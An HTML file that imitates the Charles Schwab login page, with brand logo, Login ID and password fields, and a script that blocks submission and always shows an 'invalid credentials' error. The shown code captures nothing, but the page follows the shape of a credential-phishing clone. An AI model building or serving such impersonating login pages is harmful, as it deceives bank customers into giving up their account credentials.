<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Charles Schwab Login</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .error-message {
            color: red;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <header>
        <img src="charles1.png" alt="Charles Schwab Logo" class="header-logo">
    </header>

    <div class="login-container">
        <div class="login-box">
            <h2>Log in to Schwab</h2>
           <br> <form id="loginForm" method="POST">
               <label for="loginID">Login ID</label>
                <input type="text" id="loginID" name="loginID" placeholder="Login ID" required>
                
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>

                <div class="remember-me">
                    <input type="checkbox" id="rememberLogin" name="rememberLogin">
                    <label for="rememberLogin">Remember Login ID</label>
                </div>

                <label for="startPage">Start Page</label>
                <select id="startPage" name="startPage">
                    <option value="accountSummary">Account Summary</option>
                </select>

                <button type="submit">Log In</button>
            </form>

            <div class="error-message" id="error-message">
                Error: Invalid login credentials. Please try again.
            </div>

            <div class="login-links">
                <a href="#">Forgot Login ID or Password?</a>
            </div>

            <!-- New User and Language section -->
            <div class="new-user-language">
                <a href="#">New User?</a>
                <select id="language" name="language">
                    <option value="english">English</option>
                    <option value="spanish">Espa√±ol</option>
                </select>
            </div>
        </div>

        <div class="background">
            <img src="charls3.jpeg" alt="Cityscape Background">
        </div>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent form submission

            // For demonstration, we always show an error message. In a real scenario, you'd check the credentials.
            var errorMessage = document.getElementById("error-message");
            errorMessage.style.display = "block"; // Show the error message
        });
    </script>
</body>
</html>
